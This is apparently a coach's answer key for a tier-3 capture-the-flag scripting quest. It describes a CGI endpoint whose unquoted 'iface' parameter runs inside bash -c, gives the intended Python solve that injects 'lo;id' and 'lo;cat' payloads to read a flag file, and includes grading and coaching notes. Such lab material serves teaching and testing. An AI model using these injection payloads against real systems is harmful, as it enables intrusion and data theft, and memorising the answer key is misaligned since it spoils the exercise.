Quest: scr-t3-cmd-inject (tier 3, scripting)

Ground truth for the coach:
- web01 (.20) apache + /cgi-bin/status?iface= →
  `ip -brief addr show $Q` unquoted inside bash -c — injection sink
- wwwops/wwwops home: notes.txt (decoy pointing at ~wwwops) +
  loot.txt (injected file flag — submit it)
- command flag (kali): /root/inject.py exists AND /root/loot.txt
  contains `pentrAIn{` — the script must actually exfiltrate

Intended solve:
```python
import requests, re
B = "http://10.x.10.20/cgi-bin/status"
r = requests.get(B, params={"iface": "lo;id"})
# → proof of execution
loot = requests.get(B, params={"iface": "lo;cat /home/wwwops/loot.txt"}).text
open("/root/loot.txt","w").write(re.search(r"pentrAIn{[^}]*}", loot).group(0))
```

Coach guidance:
- params= handles encoding — trainees hand-writing %3B usually break on
  spaces (must be %20 or +).
- If they report '== iface lo;id ==' with no output: the `==` banner is
  the only output when the command fails — point at stderr merge (2>&1
  is already in the CGI).
- Wrong turn: interactive nc/revshell — the flag is read through the CGI,
  no reverse shell needed; the GRADER wants the python path anyway.
